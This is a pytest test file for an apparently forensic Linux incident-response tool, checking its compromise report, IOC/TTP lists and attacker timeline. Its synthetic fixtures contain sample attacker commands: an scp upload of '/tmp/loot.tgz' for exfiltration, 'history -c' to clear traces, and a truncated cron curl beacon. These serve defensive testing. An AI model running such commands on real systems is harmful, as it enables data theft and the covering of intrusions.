"""Day-7 reporter + persona: the 12 mandatory IR answers, IOC/TTP, recommendations, persona."""

from __future__ import annotations

from pathlib import Path

from linuxir.adapters.intel import IntelResult
from linuxir.agents import persona_builder, reporter
from linuxir.agents.coordinator import InvestigationResult
from linuxir.agents.linux_ir_expert import ExpertResult
from linuxir.config import CaseConfig
from linuxir.findings import Confidence, Finding


def _f(fid, agent, title, *, desc="", out="", tech=None, refs=()) -> Finding:
    f = Finding(id=fid, title=title, description=desc, technique=tech,
                confidence=Confidence.HIGH, source_tool_output=out, evidence_refs=list(refs))
    f.agent = agent
    return f


def _result(tmp_path) -> InvestigationResult:
    case = CaseConfig(case_id="rep", evidence_scope=(tmp_path / "ev",), workspace=tmp_path / "ws")
    findings = [
        _f("ia", "log", "Initial access: accepted SSH login from 185.220.101.47",
           out="Mar 13 08:05:57 h sshd: Accepted password for jdoe from 185.220.101.47",
           tech="T1078 / T1110", refs=["/ev/var/log/auth.log"]),
        _f("cron", "disk", "Cron persistence: C2 beacon in /etc/cron.d",
           out="* * * * * root curl ...", tech="T1053.003", refs=["/ev/etc/cron.d/x"]),
        _f("exfil", "log", "Data archived and exfiltrated via scp",
           out="#1672948085\nscp /tmp/loot.tgz user@host:/data/", tech="T1041"),
        _f("af", "log", "Shell history cleared (history -c)",
           out="history -c", tech="T1070"),
    ]
    expert = ExpertResult(
        polished_markdown="# Polished analysis\n## Executive narrative\nAn insider exfiltrated "
        "data after SSH access.\n## MITRE ATT&CK coverage\n- T1078",
        ioc_matches=[IntelResult("185.220.101.47", "ip", "malicious", ["tor-exit-list"], "tor")],
        mitre_techniques=["T1041 (Exfiltration)", "T1053.003 (Persistence)", "T1078 (Initial Access)"],
    )
    return InvestigationResult(
        case=case, confirmed_findings=findings,
        correlations=["User 'jdoe' links disk, log: findings ia, cron."], expert=expert)


def test_all_12_questions_present(tmp_path):
    ca = reporter.build_compromise_answers(_result(tmp_path))
    for _key, q in reporter.MANDATORY_IR_QUESTIONS:
        assert q in ca, f"missing question: {q}"
    assert ca.count("_(confidence:") == 12          # every answer carries a confidence
    assert "[[analysis-" in ca and "Artifacts:" in ca  # citations + artifacts


def test_compromised_yes_and_key_answers(tmp_path):
    ca = reporter.build_compromise_answers(_result(tmp_path))
    assert "1. Is this device compromised?" in ca
    assert "Yes" in ca.split("compromised?")[1][:120]
    assert "jdoe" in ca                            # accounts from correlation
    assert "185.220.101.47" in ca                    # origin
    assert "Yes — persistence" in ca
    assert "Yes — data exfiltration" in ca


def test_ioc_ttp_and_recommendations(tmp_path):
    r = _result(tmp_path)
    ioc = reporter.build_ioc_ttp(r)
    assert "T1078 (Initial Access)" in ioc and "185.220.101.47" in ioc
    assert "User 'jdoe' links" in ioc              # IOA correlations
    rec = reporter.build_recommendations(r)
    assert "Persistence" in rec and "Hardening" in rec
    assert len(rec.splitlines()) > 5


def test_persona_timeline_ordered_and_profile(tmp_path):
    r = _result(tmp_path)
    tl = persona_builder.build_timeline(r)
    # epoch event (Jan 2023) must sort before the March syslog event
    assert tl.index("exfiltrated") < tl.index("Initial access")
    prof = persona_builder.build_attacker_profile(r)
    assert "objective" in prof.lower() and "T1078 (Initial Access)" in prof
    narr = persona_builder.build_narrative(r)
    assert "insider exfiltrated data" in narr.lower()  # reused expert narrative


def test_no_phantom_user_from_host_path(tmp_path):
    # A finding whose only "username-shaped" token is the host evidence path must NOT
    # produce a suspected account (regression: /home/sansforensics phantom).
    from linuxir.agents.coordinator import correlate_findings
    a = _f("a", "disk", "x", desc="found", refs=["/home/sansforensics/case/ev/etc/passwd"])
    b = _f("b", "log", "y", desc="found", refs=["/home/sansforensics/case/ev/var/log/auth.log"])
    notes = correlate_findings([a, b])
    assert not any("sansforensics" in n for n in notes)
